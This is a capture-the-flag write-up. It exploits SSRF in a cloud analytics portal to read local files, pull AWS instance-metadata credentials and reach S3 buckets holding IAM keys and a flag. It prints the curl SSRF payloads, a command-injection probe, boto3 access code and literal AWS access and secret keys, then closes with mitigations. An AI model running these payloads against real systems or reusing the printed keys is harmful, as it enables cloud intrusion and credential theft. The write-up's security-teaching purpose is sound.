# MediCloudX Data Analytics I - CTF Writeup

**Challenge:** MediCloudX Data Analytics I
**Points:** 451
**Category:** Web Security / Cloud Security
**Hint:** "Una vulnerabilidad muy conocida en ataques web" (A well-known vulnerability in web attacks)

## Flag

```
CTF{m3d1cl0udx_d4t4_4n4lys1s_cr3d3nt14l_3xf1ltr4t10n}
```

## Challenge Description

MediCloudX has developed a data analytics portal at http://23.21.237.126 that includes a connectivity verification tool for external services. The goal is to find and exploit a web vulnerability to obtain the flag.

## Reconnaissance

### Initial Discovery

Accessing the website revealed a "Verificador de Conectividad de Servicios Externos" (External Services Connectivity Checker) tool that accepts URLs to verify connectivity with external services.

- **Server:** Apache/2.4.65 with PHP 5.4.16 (outdated, from 2013)
- **Functionality:** Accepts URL parameter and fetches content using curl
- **Test:** Successfully fetched google.com content

## Vulnerability Analysis

### SSRF (Server-Side Request Forgery)

The URL verification tool has an SSRF vulnerability that allows:
1. **Protocol support:** Both HTTP and file:// protocols
2. **Internal access:** Can reach internal AWS metadata endpoints
3. **File system access:** Can read local files via file:// protocol

### Testing the Vulnerability

```bash
# Test 1: Local file access
curl "http://23.21.237.126/?url=file:///etc/passwd"
# Result: ✅ Successfully read /etc/passwd

# Test 2: AWS metadata endpoint
curl "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/"
# Result: ✅ Successfully accessed metadata service

# Test 3: Command injection attempts
curl "http://23.21.237.126/?url=google.com;ls"
# Result: ❌ Rejected - "Bad hostname"
```

## Exploitation

### Step 1: Access AWS Metadata Service

```bash
# List IAM role
curl -s "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Found: ctf-25-ec2-data-analysis-role-l2808981

# Retrieve role credentials
curl -s "http://23.21.237.126/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ctf-25-ec2-data-analysis-role-l2808981"
```

**Retrieved Credentials:**
- AccessKeyId: `ASIA5HCACCPUKE4B3UB6`
- SecretAccessKey: `cf/jaudfJ7s26gC3D7RgaLxVRTRxqqmxm1GOX0QL`
- SessionToken: [truncated for brevity]

### Step 2: Discover S3 Bucket Names

```bash
# Access EC2 user-data
curl -s "http://23.21.237.126/?url=http://169.254.169.254/latest/user-data"
```

**Found in user-data:**
```bash
export MEDICLOUDX_CREDENTIALS_BUCKET="ctf-25-medicloudx-credentials-l2808981"
export MEDICLOUDX_PATIENT_DATA_BUCKET="ctf-25-medicloudx-patient-data-l2808981"
```

### Step 3: Access Credentials Bucket

Using the EC2 role credentials with boto3:

```python
import boto3

session = boto3.Session(
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY,
    aws_session_token=AWS_SESSION_TOKEN,
    region_name='us-east-1'
)

s3 = session.client('s3')
objects = s3.list_objects_v2(Bucket='ctf-25-medicloudx-credentials-l2808981')
```

**Found IAM User Credentials:**

1. **carlos.cardenas:**
   - Access Key: `AKIA5HCACCPUM5JVDROJ`
   - Secret Key: `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`
   - File: `employees/carlos.cardenas/carlos.cardenas.csv`

2. **daniel.lopez:**
   - Access Key: `AKIA5HCACCPUMNRPJAMJ`
   - Secret Key: `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`
   - File: `employees/daniel.lopez/aws-credentials.csv`

### Step 4: Access Patient Data Bucket

Testing both sets of credentials:
- carlos.cardenas: ❌ Access Denied
- daniel.lopez: ✅ Access Granted

```python
session = boto3.Session(
    aws_access_key_id='AKIA5HCACCPUMNRPJAMJ',
    aws_secret_access_key='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',
    region_name='us-east-1'
)

s3 = session.client('s3')
response = s3.get_object(
    Bucket='ctf-25-medicloudx-patient-data-l2808981',
    Key='analytics/patient-insights/flag.txt'
)

flag = response['Body'].read().decode('utf-8')
print(flag)
```

**Flag Retrieved:**
```
CTF{m3d1cl0udx_d4t4_4n4lys1s_cr3d3nt14l_3xf1ltr4t10n}
```

## Attack Chain Summary

```
1. SSRF in URL Verification Tool
   ↓
2. Access AWS EC2 Metadata Endpoint
   ↓
3. Extract Temporary IAM Role Credentials
   ↓
4. Read EC2 User-Data for Bucket Names
   ↓
5. Use Role Credentials to Access Credentials Bucket
   ↓
6. Extract IAM User Credentials (carlos.cardenas, daniel.lopez)
   ↓
7. Use daniel.lopez Credentials to Access Patient Data Bucket
   ↓
8. Read Flag from analytics/patient-insights/flag.txt
```

## Security Issues Identified

### 1. Server-Side Request Forgery (SSRF)
- **Impact:** CRITICAL
- **Issue:** URL verification tool doesn't validate or restrict URL schemes
- **Exploitation:** Allows access to internal AWS metadata service and local files

### 2. Unrestricted Metadata Endpoint Access
- **Impact:** HIGH
- **Issue:** EC2 instance can access metadata endpoint without restrictions
- **Exploitation:** Retrieved temporary IAM credentials

### 3. Insecure Credential Storage
- **Impact:** CRITICAL
- **Issue:** IAM user credentials stored in plain text in S3 bucket
- **Best Practice:** Use AWS Secrets Manager or Parameter Store

### 4. Overly Permissive IAM Policies
- **Impact:** HIGH
- **Issue:** EC2 role has read access to credentials bucket
- **Principle:** Least privilege not followed

### 5. Sensitive Data in User-Data
- **Impact:** MEDIUM
- **Issue:** S3 bucket names exposed in EC2 user-data
- **Risk:** Information disclosure aids attackers

## Mitigation Recommendations

### For SSRF Prevention:
1. **Input Validation:**
   - Whitelist allowed protocols (only https://)
   - Whitelist allowed domains/IP ranges
   - Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Block localhost and metadata endpoint (169.254.169.254)

2. **Example PHP Fix:**
```php
function isValidUrl($url) {
    // Parse URL
    $parsed = parse_url($url);

    // Only allow HTTPS
    if ($parsed['scheme'] !== 'https') {
        return false;
    }

    // Resolve hostname to IP
    $ip = gethostbyname($parsed['host']);

    // Block private IPs
    if (filter_var($ip, FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }

    return true;
}
```

### For AWS Security:

1. **Use IMDSv2:**
```bash
# Require IMDSv2 (session-based)
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxxxx \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

2. **Implement Least Privilege IAM:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject"],
    "Resource": ["arn:aws:s3:::specific-bucket/specific-prefix/*"]
  }]
}
```

3. **Never Store Credentials in S3:**
   - Use AWS Secrets Manager
   - Use AWS Systems Manager Parameter Store
   - Implement credential rotation

4. **Secure User-Data:**
   - Don't include sensitive information
   - Use AWS Systems Manager for configuration
   - Encrypt user-data if necessary

## Tools Used

- **curl:** For SSRF exploitation
- **Python 3** with **boto3:** For AWS API interactions
- **grep/sed:** For parsing responses

## Lessons Learned

1. **SSRF is powerful:** Can lead to complete AWS account compromise
2. **Defense in Depth:** Multiple security failures led to exploitation
3. **Metadata Security:** IMDSv2 would have prevented credential theft
4. **Credential Management:** Never store long-term credentials in S3
5. **Least Privilege:** Overly permissive IAM policies increase blast radius

## References

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)

---

**Date Completed:** 2025-11-21
**Difficulty Rating:** Medium
**Time Spent:** ~45 minutes
